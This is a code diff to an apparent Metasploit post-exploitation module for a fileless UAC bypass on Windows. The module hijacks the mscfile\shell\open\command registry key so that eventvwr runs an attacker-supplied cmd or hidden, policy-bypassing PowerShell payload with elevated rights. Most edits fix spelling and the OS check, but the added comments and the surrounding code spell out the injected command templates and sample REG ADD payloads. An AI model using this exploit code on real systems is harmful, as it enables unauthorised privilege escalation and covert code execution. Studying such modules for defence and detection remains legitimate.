@@ -41,9 +41,14 @@
 # Exec powershell shellcode insted of a cmd?   => set USE_POWERSHELL true
 # ---
 # HINT: To deploy a powershell payload (shellcode string) we need to set the option
-# 'USE_POWERSHELL true' and input the powershell base64 encoded shellcode into 'EXEC_COMMAND'
+# 'USE_POWERSHELL true' and input the base64 encoded 'shellcode' into 'EXEC_COMMAND'
 # EXAMPLE: set USE_POWERSHELL true
 # EXAMPLE: set EXEC_COMMAND aDfSjRnGlsWlDtBsQkGftmoEdD==
+#
+# command to be injected IF 'use_powershell true' its active:
+# %SystemRoot%\System32\WindowsPowershell\v1.0\powershell.exe -nop -wind hidden -Exec Bypass -noni -enc < EXEC_COMMAND >
+# command to be injected IF 'use_powershell false' its active:
+# %SystemRoot%\System32\cmd.exe /c < EXEC_COMMAND >
 # ---
 #
 #
@@ -190,7 +195,7 @@ def ls_stage1
   end
 
     # search in target regedit if eventvwr calls mmc.exe
-    print_warning("Reading proccess registry hive keys...")
+    print_warning("Reading process registry hive keys...")
     Rex::sleep(1.0)
     if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
       print_good("  exec => remote registry hive key found!")
@@ -230,14 +235,14 @@ def ls_stage1
           Rex::sleep(1.0)
         else
           comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f"
-          print_good("  exec => Injecting cmd command (cmd.exe)")
+          print_good("  exec => Injecting cmd command string (cmd.exe)")
           Rex::sleep(1.0)
         end
 
  # Execute process hijacking in registry (cmd.exe OR powershell.exe)...
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsgVkGftmoEdD==" /f
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
- print_good("  exec => Hijacking proccess to gain code execution...")
+ print_good("  exec => Hijacking process to gain code execution...")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit
  Rex::sleep(4.5)
@@ -263,7 +268,7 @@ end
 
 # check IF #{reg_clean} has sucessefuly deleted value in regedit
 # ----------------------------------------------------
-# DELETE MALICIOUS REGISTRY ENTRY (proccess hijacking)
+# DELETE MALICIOUS REGISTRY ENTRY (process hijacking)
 # ----------------------------------------------------
 def ls_stage2
 
@@ -282,7 +287,7 @@ def ls_stage2
   end
 
     # search in target regedit if hijacking method allready exists
-    print_warning("Reading proccess registry hive keys...")
+    print_warning("Reading process registry hive keys...")
     Rex::sleep(1.0)
     if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
       print_good(" exec => Remote registry hive key found!")
@@ -349,7 +354,7 @@ def ls_stage3
     Rex::sleep(1.5)
   end
 
-    print_warning("Reading proccess registry hive keys...")
+    print_warning("Reading process registry hive keys...")
     Rex::sleep(2.0)
     # check target registry hive/key settings (mmc.exe call)
     if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
@@ -399,17 +404,18 @@ def run
   session = client
 
       # Variable declarations (msf API calls)
+      oscheck = client.fs.file.expand_path("%OS%")
       sysnfo = session.sys.config.sysinfo
       runtor = client.sys.config.getuid # <-- error in this key? why?
       runsession = client.session_host
       directory = client.fs.dir.pwd
-      oscheck = client.fs.file.expand_path("%SystemRoot%")
+
 
 
     # Print banner and scan results on screen
     print_line("    +----------------------------------------------+")
     print_line("    | enigma fileless UAC bypass command execution |")
-    print_line("    |             Author: r00t-3xp10it             |")
+    print_line("    |            Author : r00t-3xp10it             |")
     print_line("    +----------------------------------------------+")
     print_line("")
     print_line("    Running on session  : #{datastore['SESSION']}")
@@ -427,7 +433,7 @@ def run
     # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
     #
     # check for proper operative system (windows)
-    if not oscheck == "C:\\Windows"
+    if not oscheck == "Windows_NT"
       print_error("[ ABORT ]: This module only works againts windows systems")
       return nil
     end
